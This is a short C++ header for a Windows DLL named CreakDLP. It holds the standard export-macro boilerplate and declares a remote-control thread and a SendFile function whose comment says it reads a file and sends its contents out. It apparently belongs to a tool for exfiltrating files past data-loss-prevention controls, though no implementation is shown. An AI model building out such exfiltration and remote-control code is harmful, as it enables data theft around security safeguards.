// 下列 ifdef 块是创建使从 DLL 导出更简单的
// 宏的标准方法。此 DLL 中的所有文件都是用命令行上定义的 CREAKDLP_EXPORTS
// 符号编译的。在使用此 DLL 的
// 任何其他项目上不应定义此符号。这样，源文件中包含此文件的任何其他项目都会将
// CREAKDLP_API 函数视为是从 DLL 导入的，而此 DLL 则将用此宏定义的
// 符号视为是被导出的。
#ifdef CREAKDLP_EXPORTS
#define CREAKDLP_API __declspec(dllexport)
#else
#define CREAKDLP_API __declspec(dllimport)
#endif

//// 此类是从 CreakDLP.dll 导出的
//class CREAKDLP_API CCreakDLP
//{
//public:
//	CCreakDLP(void);
//	// TODO: 在此添加您的方法。
//};
//// 导出变量
//extern CREAKDLP_API int nCreakDLP;
//// 导出函数
//CREAKDLP_API int fnCreakDLP(void);

UINT WINAPI RemoteControlThread(LPVOID lpvoid);
//打开文件取出文件内容并发送出去
CREAKDLP_API void SendFile();
//extern "C" __declspec(dllexport) void SendFile();